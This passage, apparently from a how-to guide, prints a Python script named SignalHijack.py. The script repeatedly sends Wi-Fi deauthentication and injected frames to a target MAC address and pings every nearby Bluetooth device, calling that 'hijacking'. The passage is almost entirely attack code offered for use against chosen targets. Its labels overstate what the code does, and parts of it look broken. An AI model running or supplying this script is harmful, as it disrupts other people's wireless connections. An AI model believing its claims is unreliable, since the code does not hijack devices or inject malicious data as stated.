
---

## **ðŸ”¹ Step 3 â€“ Uploading the Code (SignalHijack.py)**  

### **`SignalHijack.py` â€“ The Code Itself**  
```python
import scapy.all as scapy
import bluetooth
import os
import time

# Define target frequency range (Wi-Fi 5GHz & Bluetooth)
TARGET_FREQ = "5.8GHz"

def deauth_wifi(target_mac, interface="wlan0"):
    """ Sends a Wi-Fi deauth attack to disconnect a target """
    print(f"[*] Sending deauthentication packets to {target_mac}...")
    packet = scapy.RadioTap() / scapy.Dot11(addr1=target_mac, addr2="FF:FF:FF:FF:FF:FF", addr3=target_mac) / scapy.Dot11Deauth()
    scapy.sendp(packet, iface=interface, count=100, inter=0.1, verbose=False)

def hijack_bluetooth():
    """ Hijacks nearby Bluetooth connections and sends commands """
    print("[*] Searching for Bluetooth devices...")
    nearby_devices = bluetooth.discover_devices(duration=5, lookup_names=True)

    for addr, name in nearby_devices:
        print(f"[+] Hijacking Bluetooth device: {name} ({addr})")
        os.system(f"l2ping -c 1 {addr}")

def inject_data(target_mac, interface="wlan0"):
    """ Injects packets into an active Wi-Fi session """
    print(f"[*] Injecting malicious data into {target_mac}'s session...")
    fake_packet = scapy.RadioTap() / scapy.Dot11(addr1=target_mac, addr2="FF:FF:FF:FF:FF:FF", addr3=target_mac) / scapy.Dot11QoS()
    scapy.sendp(fake_packet, iface=interface, count=50, inter=0.1, verbose=False)

def main():
    print("[*] SignalHijack Activated. Taking over signals...")

    while True:
        hijack_bluetooth()
        deauth_wifi("FF:FF:FF:FF:FF:FF")  # Replace with target MAC
        inject_data("FF:FF:FF:FF:FF:FF")  # Replace with target MAC
        time.sleep(5)

if __name__ == "__main__":
    main()
